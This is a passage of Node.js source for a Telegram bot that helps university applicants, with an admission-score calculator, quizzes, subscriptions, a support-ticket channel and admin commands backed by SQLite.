//PedPRBot (working name)
//by alexavil, 2022
//Licensed by MIT License
//The lead developer keeps the right to modify or disable the service at any given time.

const TelegramBot = require('node-telegram-bot-api');
const {
   VK,
   API
} = require('vk-io');
const fs = require('fs');
const sql = require('better-sqlite3');
const token = process.env.TOKEN || process.argv[2];
var adminid = "";
const bot = new TelegramBot(token, {
   polling: true,
   onlyFirstMatch: true
});
const child = require('child_process');
const {
   request
} = require('http');

var defaultlang = "";
var locales = ["en", "ru"];
let settings = new sql('settings.db');

if (fs.existsSync('./firstrun')) {
   settings.prepare("create table if not exists settings (option text UNIQUE, value text)").run();
   settings.prepare("create table if not exists users (id INTEGER UNIQUE, is_subscribed text, is_contactbanned text, is_banned text, status text, language text)").run();
   settings.prepare("create table if not exists tickets (id INTEGER PRIMARY KEY, userid INTEGER UNIQUE)").run();
   settings.prepare("insert or ignore into settings (option, value) values ('contact_channel', '')").run();
   settings.prepare("insert or ignore into settings (option, value) values ('sub_channel', '')").run();
   settings.prepare("insert or ignore into settings (option, value) values ('vk_token', '')").run();
   settings.prepare("insert or ignore into settings (option, value) values ('vk_group', '')").run();
   settings.prepare("insert or ignore into settings (option, value) values ('calculator', 'true')").run();
   settings.prepare("insert or ignore into settings (option, value) values ('subscribe', 'true')").run();
   settings.prepare("insert or ignore into settings (option, value) values ('contact', 'true')").run();
   settings.prepare("insert or ignore into settings (option, value) values ('quiz', 'true')").run();

locales.forEach(locale => {
   var messages = JSON.parse(fs.readFileSync('./messages_' + locale + '.json'));
   settings.prepare(`create table if not exists quizzes_${locale} (id INTEGER PRIMARY KEY, provider text, link text, name text)`).run();
   settings.prepare(`create table if not exists quizzes_interactive_${locale} (id INTEGER PRIMARY KEY, name text, question text, answers text)`).run();
   settings.prepare(`create table if not exists courses_${locale} (id INTEGER UNIQUE, name text, subjects text, min_score INTEGER, budget text)`).run();
   settings.prepare(`create table if not exists subjects_${locale} (id INTEGER PRIMARY KEY, name text)`).run();
   settings.prepare(`create table if not exists custom_commands_${locale} (id INTEGER PRIMARY KEY, type text, string text, response text, link text)`).run();
   settings.prepare(`insert or ignore into settings (option, value) values ('welcome_text_${locale}', ?)`).run(messages.messages.greeting_default);
   settings.prepare(`insert or ignore into settings (option, value) values ('faq_text_${locale}', ?)`).run(messages.messages.faq_default);
   settings.prepare(`insert or ignore into settings (option, value) values ('webbutton_text_${locale}', ?)`).run(messages.messages.webopen_default);
   settings.prepare(`insert or ignore into settings (option, value) values ('website_link_${locale}', 'https://aguickers.github.io/AGUickers_WebStock/${locale}/')`).run();
});
   adminid = process.env.ADMINID || process.argv[3];
   defaultlang = process.env.DEF_LANG || process.argv[4];
   if (adminid == "" || defaultlang == "") {
      console.log("Please, fill the arguments.");
      process.exit();
   }
   settings.prepare("insert or ignore into settings (option, value) values ('default_lang', ?)").run(defaultlang);
   settings.prepare("insert or ignore into settings (option, value) values ('owner_id', ?)").run(adminid);
   settings.prepare("insert or ignore into users values (?, ?, ?, ?, ?, ?)").run(adminid, "false", "false", "false", "superadmin", defaultlang);
   fs.unlinkSync('./firstrun');
} else {
   adminid = settings.prepare("select value from settings where option = 'owner_id'").get().value;
}

function getLocale(id, defaultlang) {
   defaultlang = settings.prepare("select value from settings where option = 'default_lang'").get().value;
console.log(defaultlang);
   var user = settings.prepare('SELECT language FROM users WHERE id = ?').get(id);
   if (user) {
      return user.language;
   } else {
      return defaultlang;
   }
}

function adminCheck(id) {
   //Get user status from the database
   var user = settings.prepare('SELECT status FROM users WHERE id = ?').get(id);
   if (user) {
      console.log(user.status);
      if (user.status == "admin" || user.status == "superadmin") {
         return true;
      } else {
         return false;
      }
   }
}

function superadminCheck(id) {
   //Get user status from the database
   var user = settings.prepare('SELECT status FROM users WHERE id = ?').get(id);
   if (user) {
      if (user.status == "superadmin") {
         return true;
      } else {
         return false;
      }
   }
}

function createquiz(provider, id, locale) {
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(id, defaultlang) + '.json'));
   switch (provider) {
      case "telegram":
         var name = "";
         var question = "";
         var answers = "";
         var answers_array = [];
         //Prompt user for quiz name
         bot.sendMessage(id, messages.messages.quiz_name_prompt);
         bot.once('message', (msg) => {
            if (msg.text == "/cancel") return bot.sendMessage(id, messages.messages.cancelled);
            name = msg.text;
            //Prompt for the question
            bot.sendMessage(id, messages.messages.quiz_question_prompt);
            bot.once('message', (msg) => {
               if (msg.text == "/cancel") return bot.sendMessage(id, messages.messages.cancelled);
               question = msg.text;
               //Prompt for the answers
               bot.sendMessage(id, messages.messages.quiz_answers_prompt);
               bot.once('message', (msg) => {
                  if (msg.text == "/cancel") return bot.sendMessage(id, messages.messages.cancelled);
                  answers_array = msg.text.split(", ");
                  if (answers_array.length > 10) {
                     answers = answers_array.slice(0, 10).join(", ");
                  } else {
                     answers = answers_array.join(", ");
                  }
                  //Insert quiz into the database
                  settings.prepare(`INSERT INTO quizzes_${locale} (provider, link, name) VALUES (?, ?, ?)`).run(provider, "N/A", name);
                  settings.prepare(`INSERT INTO quizzes_interactive_${locale} (name, question, answers) VALUES (?, ?, ?)`).run(name, question, answers);
                  //Send message to the user
                  bot.sendMessage(id, messages.messages.quiz_created);
               });
            });
         });
         break;
      case "external":
         var name = "";
         var link = "";
         //Prompt user for quiz name
         bot.sendMessage(id, messages.messages.quiz_name_prompt);
         bot.once('message', (msg) => {
            if (msg.text == "/cancel") return bot.sendMessage(id, messages.messages.cancelled);
            name = msg.text;
            //Prompt for the question
            bot.sendMessage(id, messages.messages.quiz_link_prompt);
            bot.once('message', (msg) => {
               if (msg.text == "/cancel") return bot.sendMessage(id, messages.messages.cancelled);
               if (!msg.text.startsWith("https://")) return bot.sendMessage(chatId, messages.messages.website_invalid);
               link = msg.text;
               settings.prepare(`INSERT INTO quizzes_${locale} (provider, link, name) VALUES (?, ?, ?)`).run(provider, link, name);
               //Send message to the user
               bot.sendMessage(id, messages.messages.quiz_created);
            });
         });
         break;
   }
}

function getquiz(id, name, locale) {
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(id, defaultlang) + '.json'));
   var quiz = settings.prepare(`SELECT * FROM quizzes_${locale} WHERE name = ?`).get(name);
   if (quiz) {
      switch (quiz.provider) {
         case "telegram":
            var question = settings.prepare(`SELECT * FROM quizzes_interactive_${locale} WHERE name = ?`).get(quiz.name);
            bot.sendPoll(id, question.question, question.answers.split(", "), {
               "allows_multiple_answers": true,
               "is_anonymous": false
            });
            break;
         case "external":
            bot.sendMessage(id, messages.messages.quiz_external_intro, {
               reply_markup: {
                  inline_keyboard: [
                     [{
                        text: messages.messages.webopen_default,
                        web_app: {
                           url: quiz.link
                        }
                     }],
                  ]
               }
            });
            break;
      }
   } else {
      return false;
   }
}

function addsubject(id, locale) {
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(id, defaultlang) + '.json'));
   //Prompt for the subject name
   bot.sendMessage(id, messages.messages.addsubject_prompt);
   bot.once("message", (msg) => {
      if (msg.text == "/cancel") {
         return bot.sendMessage(chatId, messages.messages.cancelled);
      }
      //Add the subject to the database
      settings.prepare(`INSERT INTO subjects_${locale} (name) VALUES (?)`).run(msg.text);
      bot.sendMessage(id, messages.messages.subject_added);
      //Ask if the user wants to add another subject
      bot.sendMessage(id, messages.messages.addsubject_again, {
         reply_markup: {
            inline_keyboard: [
               [{
                  text: messages.messages.yes,
                  callback_data: "yes"
               }, {
                  text: messages.messages.no,
                  callback_data: "no"
               }]
            ]
         }
      });
      bot.once("callback_query", (callbackQuery) => {
         if (callbackQuery.data == "yes") {
            addsubject(id, locale);
         } else {
            return bot.sendMessage(id, messages.messages.cancelled);
         }
      });

   });
}

function addcourse(userid, locale) {
   var id = "";
   var name = "";
   var reqsubjects = [];
   var score = "";
   var budget = "";
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(userid, defaultlang) + '.json'));
   //Get all subjects from the database
   var subjects = settings.prepare(`SELECT * FROM subjects_${locale}`).all();
   //If no subjects are found, return
   if (subjects.length == 0) {
      return bot.sendMessage(userid, messages.messages.no_subjects);
   }
   //Ask for the course name
   bot.sendMessage(userid, messages.messages.course_prompt);
   bot.once("message", (msg) => {
      if (msg.text == "/cancel") {
         return bot.sendMessage(userid, messages.messages.cancelled);
      }
      name = msg.text;
      //Create a poll for the subjects, if less than 10
      if (subjects.length <= 10) {
         calc_poll();
      } else {
         calc_msg();
      }

      function calc_poll() {
         bot.sendPoll(userid, messages.messages.choose, subjects.map(subject => subject.name), {
            "allows_multiple_answers": true,
            "is_anonymous": false
         });
         bot.once("poll_answer", (ans) => {
            id = ans.poll_id;
            reqsubjects = ans.option_ids.toString();
            //Ask for the score
            bot.sendMessage(userid, messages.messages.score_prompt);
            bot.once("message", (msg) => {
               if (msg.text == "/cancel") {
                  return bot.sendMessage(userid, messages.messages.cancelled);
               }
               score = msg.text;
               //Prompt for the budget places
               bot.sendMessage(userid, messages.messages.budget_prompt);
               bot.once("message", (msg) => {
                  if (msg.text == "/cancel") {
                     return bot.sendMessage(userid, messages.messages.cancelled);
                  }
                  budget = msg.text;
                  //Insert the course into the database
                  settings.prepare(`INSERT INTO courses_${locale} VALUES(?,?,?,?,?)`).run(id, name, reqsubjects, score, budget);
                  bot.sendMessage(userid, messages.messages.course_added);
                  bot.sendMessage(userid, messages.messages.addcourse_again, {
                     reply_markup: {
                        inline_keyboard: [
                           [{
                              text: messages.messages.yes,
                              callback_data: "yes"
                           }, {
                              text: messages.messages.no,
                              callback_data: "no"
                           }]
                        ]
                     }
                  });
                  bot.once("callback_query", (callbackQuery) => {
                     if (callbackQuery.data == "yes") {
                        addcourse(userid, locale);
                     } else {
                        return bot.sendMessage(userid, messages.messages.cancelled);
                     }
                  });
               });
            });
         });
      }

      function calc_msg() {
         var message = "";
         for (var i = 0; i < subjects.length; i++) {
            message += subjects[i].id + " - " + subjects[i].name + "\n";
         }
         bot.sendMessage(msg.from.id, message);
         bot.sendMessage(msg.from.id, messages.messages.input_subjects);
         bot.once("message", (msg) => {
            if (msg.text == "/cancel") {
               return bot.sendMessage(userid, messages.messages.cancelled);
            }
            id = msg.message_id;
            var ids = msg.text.split(", ");
            ids.forEach(option => {
               option = parseInt(option) - 1;
               reqsubjects.push(option);
            });
            //Ask for the score
            bot.sendMessage(userid, messages.messages.score_prompt);
            bot.once("message", (msg) => {
               if (msg.text == "/cancel") {
                  return bot.sendMessage(userid, messages.messages.cancelled);
               }
               score = msg.text;
               //Prompt for the budget places
               bot.sendMessage(userid, messages.messages.budget_prompt);
               bot.once("message", (msg) => {
                  if (msg.text == "/cancel") {
                     return bot.sendMessage(userid, messages.messages.cancelled);
                  }
                  budget = msg.text;
                  //Insert the course into the database
                  settings.prepare(`INSERT INTO courses_${locale} VALUES(?,?,?,?,?)`).run(id, name, reqsubjects.toString(), score, budget);
                  bot.sendMessage(userid, messages.messages.course_added);
                  bot.sendMessage(userid, messages.messages.addcourse_again, {
                     reply_markup: {
                        inline_keyboard: [
                           [{
                              text: messages.messages.yes,
                              callback_data: "yes"
                           }, {
                              text: messages.messages.no,
                              callback_data: "no"
                           }]
                        ]
                     }
                  });
                  bot.once("callback_query", (callbackQuery) => {
                     if (callbackQuery.data == "yes") {
                        addcourse(userid, locale);
                     } else {
                        return bot.sendMessage(userid, messages.messages.cancelled);
                     }
                  });
               });
            });
         });
      }
   });
}

function calc(id, options) {
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(id, defaultlang) + '.json'));
   var count = 0;
   //Get all courses
   var courses = settings.prepare(`SELECT * FROM courses_${getLocale(id, defaultlang)}`).all();
   if (courses.length == 0) return bot.sendMessage(id, messages.messages.no_courses);
   //Send a waiting message
   bot.sendMessage(id, messages.messages.calculating);
   //For each course
   courses.forEach(course => {
      var subjects = course.subjects.split(",");
      var is_in = true;
      for (var i = 0; i < subjects.length; i++) {
         if (!options.includes(subjects[i])) {
            is_in = false;
         }
      }
      if (is_in) {
         count = count + 1;
         var ready = messages.messages.coursefield1 + course.name + "\n" + messages.messages.coursefield2 + course.min_score + "\n" + messages.messages.coursefield3 + course.budget;
         return bot.sendMessage(id, ready);
      }
   });
}

//This sucks as it doesn't account for different languages and courses
//var subjects = ["Русский язык", "Математика", "Обществознание", "География", "Биология", "Химия", "Иностранный язык", "Информатика", "История", "Литература"];

//User commands

bot.onText(/\/start/, (msg, match) => {
   const chatId = msg.chat.id;
   console.log(msg.from.id);
   //Return if not a private channel
   if (msg.chat.type != "private") return;
   //Add a new user to the users table of the database if the entry doesn't exist
   settings.prepare("INSERT OR IGNORE INTO users VALUES(?,?,?,?,?,?)").run(msg.from.id, "false", "false", "false", "user", defaultlang);
   //Send messages
   //Get welcome message from the database
   var welcome = settings.prepare("SELECT value FROM settings WHERE option = 'welcome_text_" + getLocale(msg.from.id, defaultlang) + "'").get();
   var buttontext = settings.prepare("SELECT value FROM settings WHERE option = 'webbutton_text_" + getLocale(msg.from.id, defaultlang) + "'").get();
   var website = settings.prepare("SELECT value FROM settings WHERE option = 'website_link_" + getLocale(msg.from.id, defaultlang) + "'").get();
   bot.sendMessage(chatId, welcome.value);
   if (website.value != "") {
      bot.setChatMenuButton({
         chat_id: msg.chat.id,
         menu_button: JSON.stringify({
            type: "web_app",
            text: buttontext.value,
            web_app: {
               url: website.value
            }
         })
      })
   }
});

bot.onText(/\/help/, (msg, match) => {
   const chatId = msg.chat.id;
   var contactchannelid = settings.prepare("SELECT value FROM settings WHERE option = 'contact_channel'").get();
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   if (chatId != contactchannelid.value) {
      bot.sendMessage(chatId, messages.messages.help);
      //Get all the custom commands from the database
      var customcommands = settings.prepare("SELECT * FROM custom_commands_" + getLocale(msg.from.id, defaultlang)).all();
      if (customcommands.length > 0) {
         var message = messages.messages.customcommands;
         customcommands.forEach(customcommand => {
            message += "!" + customcommand.string + "\n";
         });
         bot.sendMessage(chatId, message);
      }
   } else bot.sendMessage(chatId, messages.messages.help_contact);
});

bot.onText(/\/faq/, (msg, match) => {
   const chatId = msg.chat.id;
   //Get faq message from the database
   var faq = settings.prepare("SELECT value FROM settings WHERE option = 'faq_text_" + getLocale(msg.from.id, defaultlang) + "'").get();
   bot.sendMessage(chatId, faq.value);
});


bot.onText(/\/newticket/, (msg, match) => {
   const chatId = msg.chat.id;
   if (msg.chat.type != "private") return;
   var contactchannelid = settings.prepare("SELECT value FROM settings WHERE option = 'contact_channel'").get().value;
   if (!contactchannelid || contactchannelid == undefined) return bot.sendMessage(chatId, messages.messages.no_contact_channel);
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   //If the module is disabled, return
   if (settings.prepare("SELECT value FROM settings WHERE option = 'contact'").get().value == "false") return;
   //If the user is banned, send a message and return
   if (settings.prepare("SELECT is_contactbanned FROM users WHERE id = ?").get(msg.from.id).is_contactbanned == "true") return bot.sendMessage(chatId, messages.messages.banned);
   //If a user already has an open ticket, send a message and return
   if (settings.prepare("SELECT * FROM tickets WHERE userid = ?").get(msg.from.id)) return bot.sendMessage(chatId, messages.messages.ticket_open);
   //Prompt the user to enter their message
   bot.sendMessage(chatId, messages.messages.contact_prompt);
   bot.once("message", (msg) => {
      if (msg.text == "/cancel") {
         return bot.sendMessage(chatId, messages.messages.cancelled);
      }
      //Add a new ticket to the database
      settings.prepare("INSERT OR IGNORE INTO tickets(userid) VALUES(?)").run(msg.from.id);
      //Forward the message to the contact channel
      bot.forwardMessage(contactchannelid, msg.chat.id, msg.message_id);
      //Send a confirmation message
      return bot.sendMessage(chatId, messages.messages.contact_sent);
   });
});

bot.onText(/\/calculator/, (msg, match) => {
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   //If toggled off, return
   if (settings.prepare("SELECT value FROM settings WHERE option = 'calculator'").get().value == "false") return;
   //Get all the subjects from the database
   var subjects = settings.prepare(`SELECT * FROM subjects_${getLocale(msg.from.id, defaultlang)}`).all();
   if (subjects.length == 0) return bot.sendMessage(msg.chat.id, messages.messages.no_subjects);
   //Send a poll with the subjects as options
   if (subjects.length <= 10) {
      bot.sendPoll(msg.chat.id, messages.messages.choose, subjects.map(subject => subject.name), {
         "allows_multiple_answers": true,
         "is_anonymous": false
      });
      bot.once('poll_answer', (ans) => {
         console.log(ans.option_ids)
         //Split the option_ids into an array
         var option_ids = ans.option_ids.toString().split(",");
         calc(msg.from.id, option_ids);
      });
   } else {
      var message = "";
      for (var i = 0; i < subjects.length; i++) {
         message += subjects[i].id + " - " + subjects[i].name + "\n";
      }
      bot.sendMessage(msg.from.id, message);
      bot.sendMessage(msg.from.id, messages.messages.input_subjects);
      bot.once('message', (msg) => {
         var option_ids = [];
         var options = msg.text.split(", ");
         options.forEach(option => {
            option = parseInt(option) - 1;
            option_ids.push(option);
         });
         calc(msg.from.id, option_ids.toString());
      });
   }
});

bot.onText(/\/quiz/, (msg, match) => {
   const chatId = msg.chat.id;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   if (msg.chat.type != "private") return;
   //If the module is disabled, return
   if (settings.prepare("SELECT value FROM settings WHERE option = 'quiz'").get().value == "false") return;
   //List all quizzes via a keyboard
   var quizzes = settings.prepare(`SELECT * FROM quizzes_${getLocale(msg.from.id, defaultlang)}`).all();
   if (quizzes.length == 0) return bot.sendMessage(chatId, messages.messages.no_quizzes);
   var keyboard = [];
   quizzes.forEach(quiz => {
      keyboard.push([{
         text: quiz.name,
         callback_data: quiz.name
      }]);
   });
   keyboard.push([{
      text: messages.messages.cancel,
      callback_data: "cancel"
   }]);
   bot.sendMessage(chatId, messages.messages.quiz_list, {
      reply_markup: {
         inline_keyboard: keyboard
      }
   });
   bot.once('callback_query', (callbackQuery) => {
      if (callbackQuery.data == "cancel") return bot.sendMessage(chatId, messages.messages.cancelled);
      //Check if quiz is valid
      var quiz = settings.prepare(`SELECT * FROM quizzes_${getLocale(msg.from.id, defaultlang)} WHERE name = ?`).get(callbackQuery.data);
      if (!quiz) return;
      return getquiz(msg.from.id, callbackQuery.data, getLocale(msg.from.id, defaultlang));
   });
});

bot.onText(/\/subscribe/, (msg, match) => {
   const chatId = msg.chat.id;
   if (msg.chat.type != "private") return;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   //If toggled off, return
   if (settings.prepare("SELECT value FROM settings WHERE option = 'subscribe'").get().value == "false") return;
   //Check if the user is already subscribed
   if (settings.prepare("SELECT is_subscribed FROM users WHERE id = ?").get(msg.from.id).is_subscribed == "true") return bot.sendMessage(chatId, messages.messages.subscribe_already);
   //Change the user status
   settings.prepare("UPDATE users SET is_subscribed = 'true' WHERE id = ?").run(msg.from.id);
   //Send a message
   return bot.sendMessage(chatId, messages.messages.subscribe_success);
});

bot.onText(/\/unsubscribe/, (msg, match) => {
   const chatId = msg.chat.id;
   if (msg.chat.type != "private") return;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   //If toggled off, return
   if (settings.prepare("SELECT value FROM settings WHERE option = 'subscribe'").get().value == "false") return;
   //Check if the user is already unsubscribed
   if (settings.prepare("SELECT is_subscribed FROM users WHERE id = ?").get(msg.from.id).is_subscribed == "false") return bot.sendMessage(chatId, messages.messages.unsubscribe_already);
   //Change the user status
   settings.prepare("UPDATE users SET is_subscribed = 'false' WHERE id = ?").run(msg.from.id);
   //Send a message
   return bot.sendMessage(chatId, messages.messages.unsubscribe_success);
});

bot.onText(/\/language/, (msg, match) => {
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id) + '.json'));
   bot.sendMessage(msg.chat.id, messages.messages.locale_prompt, {
      reply_markup: {
         inline_keyboard: [
            [{
               text: messages.messages.locale_en,
               callback_data: 'en'
            }],
            [{
               text: messages.messages.locale_ru,
               callback_data: 'ru'
            }],
            [{
               text: messages.messages.cancel,
               callback_data: "cancel"
            }]
         ]
      }
   });
   bot.once('callback_query', (callbackQuery) => {
      switch (callbackQuery.data) {
         case "cancel":
            return bot.sendMessage(callbackQuery.message.chat.id, messages.messages.cancelled);
         case "en":
         case "ru":
            settings.prepare('UPDATE users SET language = ? WHERE id = ?').run(callbackQuery.data, msg.from.id);
            bot.sendMessage(msg.from.id, messages.messages.language_changed);
            var buttontext = settings.prepare("SELECT value FROM settings WHERE option = 'webbutton_text_" + getLocale(msg.from.id, defaultlang) + "'").get();
            var website = settings.prepare("SELECT value FROM settings WHERE option = 'website_link_" + getLocale(msg.from.id, defaultlang) + "'").get();
            if (website.value != "") {
               bot.setChatMenuButton({
                  chat_id: msg.chat.id,
                  menu_button: JSON.stringify({
                     type: "web_app",
                     text: buttontext.value,
                     web_app: {
                        url: website.value
                     }
                  })
               })
            }
            break;
         default:
            break;
      }
   });
});

//Contact channel commands

//Deprecated.
/*bot.onText(/\/reply (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const args = msg.text.slice(7).split(' ');
    console.log(args[0].length);
    if (chatId != contactchannelid) return;
    bot.sendMessage(args[0], match.input.slice(args[0].length + 7, match.input.length));
});*/

//ID command: gets the ID of the user who sent the message
bot.onText(/\/id/, (msg, match) => {
   var contactchannelid = settings.prepare("SELECT value FROM settings WHERE option = 'contact_channel'").get().value;
   const chatId = msg.chat.id;
   if (chatId != contactchannelid) return;
   //Only works if we're replying to a message
   if (msg.reply_to_message == undefined) return;
   bot.sendMessage(chatId, msg.reply_to_message.forward_from.id);
});


bot.onText(/\/ban/, (msg, match) => {
   var contactchannelid = settings.prepare("SELECT value FROM settings WHERE option = 'contact_channel'").get().value;
   const chatId = msg.chat.id;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.reply_to_message.forward_from.id, defaultlang) + '.json'));
   if (chatId != contactchannelid) return;
   if (msg.reply_to_message == undefined) return;
   settings.prepare("DELETE FROM tickets WHERE userid = ?").run(msg.reply_to_message.forward_from.id);
   settings.prepare("UPDATE users SET is_contactbanned = 'true' WHERE id = ?").run(msg.reply_to_message.forward_from.id);
   return bot.sendMessage(msg.reply_to_message.forward_from.id, messages.messages.banned);
});

bot.onText(/\/unban/, (msg, match) => {
   var contactchannelid = settings.prepare("SELECT value FROM settings WHERE option = 'contact_channel'").get().value;
   const chatId = msg.chat.id;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.reply_to_message.forward_from.id, defaultlang) + '.json'));
   if (chatId != contactchannelid) return;
   if (msg.reply_to_message == undefined) return;
   settings.prepare("DELETE FROM tickets WHERE userid = ?").run(msg.reply_to_message.forward_from.id);
   settings.prepare("UPDATE users SET is_contactbanned = 'false' WHERE id = ?").run(msg.reply_to_message.forward_from.id);
   return bot.sendMessage(msg.reply_to_message.forward_from.id, messages.messages.unbanned);
});

//Close ticket
bot.onText(/\/close/, (msg, match) => {
   var contactchannelid = settings.prepare("SELECT value FROM settings WHERE option = 'contact_channel'").get().value;
   const chatId = msg.chat.id;
   if (chatId != contactchannelid) return;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   if (msg.reply_to_message == undefined) return;
   //Remove the ticket
   settings.prepare("DELETE FROM tickets WHERE userid = ?").run(msg.reply_to_message.forward_from.id);
   //Send a message
   bot.sendMessage(msg.reply_to_message.forward_from.id, messages.messages.ticket_closed);
   return bot.sendMessage(chatId, messages.messages.ticket_closed);
});


//Admin commands

//Toggle modules (calculator, contact, subscription)
bot.onText(/\/toggle/, (msg, match) => {
   const chatId = msg.chat.id;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   if (msg.chat.type != "private") return;
   if (adminCheck(msg.from.id) == false) return;

});

bot.onText(/\/adminhelp/, (msg, match) => {
   const chatId = msg.chat.id;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   if (msg.chat.type != "private") return;
   if (adminCheck(msg.from.id) == false) return;
   bot.sendMessage(chatId, messages.messages.help_admin);
   if (superadminCheck(msg.from.id)) bot.sendMessage(chatId, messages.messages.help_superadmin);
});

bot.onText(/\/contactchannel/, (msg, match) => {
   var contactchannelid = settings.prepare("SELECT value FROM settings WHERE option = 'contact_channel'").get().value;
   const chatId = msg.chat.id;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   if (adminCheck(msg.from.id) == false) return;
   if (msg.chat.type == "private") {
      return bot.sendMessage(chatId, messages.messages.channel_get + contactchannelid);
   } else {
      settings.prepare("UPDATE settings SET value = ? WHERE option = 'contact_channel'").run(chatId);
      return bot.sendMessage(chatId, messages.messages.channel_success);
   }
});

bot.onText(/\/resetcontact/, (msg, match) => {
   const chatId = msg.chat.id;
   var contactchannelid = settings.prepare("SELECT value FROM settings WHERE option = 'contact_channel'").get().value;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   if (adminCheck(msg.from.id) == false) return;
   if (msg.chat.type != "private") return;
   settings.prepare("UPDATE settings SET value = ? WHERE option = 'contact_channel'").run("");
   return bot.sendMessage(chatId, messages.messages.channel_reset);
});

//Set subscribe channel

//Telegram can't accept commands in a channel, so this is deprecated
/*bot.onText(/\/subscribechannel/, (msg, match) => {
    const chatId = msg.chat.id;
    if (msg.chat.type == "private") return;
    var statusquery = "SELECT status FROM users WHERE id = ?";
    settings.get(statusquery, [msg.from.id], (err, row) => {
        if (err) {
            return console.error(err.message);
        }
        if (row.status == "admin" || row.status == "developer") {
            settings.run(`UPDATE settings SET value=? WHERE option=?`, [chatId, "sub_channel"], function (err) {
                if (err) {
                    return console.log(err.message);
                }
                bot.sendMessage(chatId, messages.messages.subchannel_success);
                subchannelid = chatId; //updating the local value in case someone decides to edit the channel while the bot is running
            });
        }
    });
});
*/

//Reset subscribe channel
bot.onText(/\/resetsub/, (msg, match) => {
   const chatId = msg.chat.id;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   if (msg.chat.type != "private") return;
   if (adminCheck(msg.from.id) == false) return;
   settings.prepare("UPDATE settings SET value = ? WHERE option = 'sub_channel'").run("");
   return bot.sendMessage(chatId, messages.messages.subchannel_reset);
});

bot.onText(/\/addcourse/, (msg, match) => {
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   const chatId = msg.chat.id;
   if (msg.chat.type != "private") return;
   if (adminCheck(msg.from.id) == false) return;
   bot.sendMessage(msg.chat.id, messages.messages.locale_prompt, {
      reply_markup: {
         inline_keyboard: [
            [{
               text: messages.messages.locale_en,
               callback_data: 'en'
            }],
            [{
               text: messages.messages.locale_ru,
               callback_data: 'ru'
            }],
            [{
               text: messages.messages.cancel,
               callback_data: "cancel"
            }]
         ]
      }
   });
   bot.once("callback_query", (msg) => {
      switch (msg.data) {
         case "cancel":
            bot.sendMessage(chatId, messages.messages.cancelled);
            break;
         case "en":
         case "ru":
            var locale = msg.data;
            addcourse(msg.from.id, locale);
            break;
         default:
            break;
      }
   });
});


bot.onText(/\/delcourse/, (msg, match) => {
   const chatId = msg.chat.id;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   if (msg.chat.type != "private") return;
   if (adminCheck(msg.from.id) == false) return;
   bot.sendMessage(msg.chat.id, messages.messages.locale_prompt, {
      reply_markup: {
         inline_keyboard: [
            [{
               text: messages.messages.locale_en,
               callback_data: 'en'
            }],
            [{
               text: messages.messages.locale_ru,
               callback_data: 'ru'
            }],
            [{
               text: messages.messages.cancel,
               callback_data: "cancel"
            }]
         ]
      }
   });
   bot.once("callback_query", (msg) => {
      switch (msg.data) {
         case "cancel":
            bot.sendMessage(chatId, messages.messages.cancelled);
            break;
         case "en":
         case "ru":
            var locale = msg.data;
            //Get all courses from the database
            var courses = settings.prepare(`SELECT * FROM courses_${locale}`).all();
            //If no courses are found, return
            if (courses.length == 0) {
               return bot.sendMessage(chatId, messages.messages.no_courses);
            }
            //Create a keyboard with all courses
            var keyboard = [];
            for (var i = 0; i < courses.length; i++) {
               keyboard.push([{
                  text: courses[i].name,
                  callback_data: courses[i].name
               }]);
            }
            keyboard.push([{
               text: messages.messages.cancel,
               callback_data: "cancel"
            }]);
            bot.sendMessage(chatId, messages.messages.delcourse_prompt, {
               reply_markup: {
                  inline_keyboard: keyboard
               }
            });
            bot.once("callback_query", (msg) => {
               switch (msg.data) {
                  case "cancel":
                     bot.sendMessage(chatId, messages.messages.cancelled);
                     break;
                  default:
                     //Check if the course is valid
                     var course = settings.prepare(`SELECT * FROM courses_${locale} WHERE name = ?`).get(msg.data);
                     if (course == undefined) {
                        return;
                     }
                     //Delete the course from the database
                     settings.prepare(`DELETE FROM courses_${locale} WHERE name = ?`).run(msg.data);
                     return bot.sendMessage(chatId, messages.messages.course_deleted);
               }
            });
      }
   });

});

bot.onText(/\/listcourses/, (msg, match) => {
   const chatId = msg.chat.id;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   if (msg.chat.type != "private") return;
   if (adminCheck(msg.from.id) == false) return;
   bot.sendMessage(msg.chat.id, messages.messages.locale_prompt, {
      reply_markup: {
         inline_keyboard: [
            [{
               text: messages.messages.locale_en,
               callback_data: 'en'
            }],
            [{
               text: messages.messages.locale_ru,
               callback_data: 'ru'
            }],
            [{
               text: messages.messages.cancel,
               callback_data: "cancel"
            }]
         ]
      }
   });
   bot.once("callback_query", (msg) => {
      switch (msg.data) {
         case "cancel":
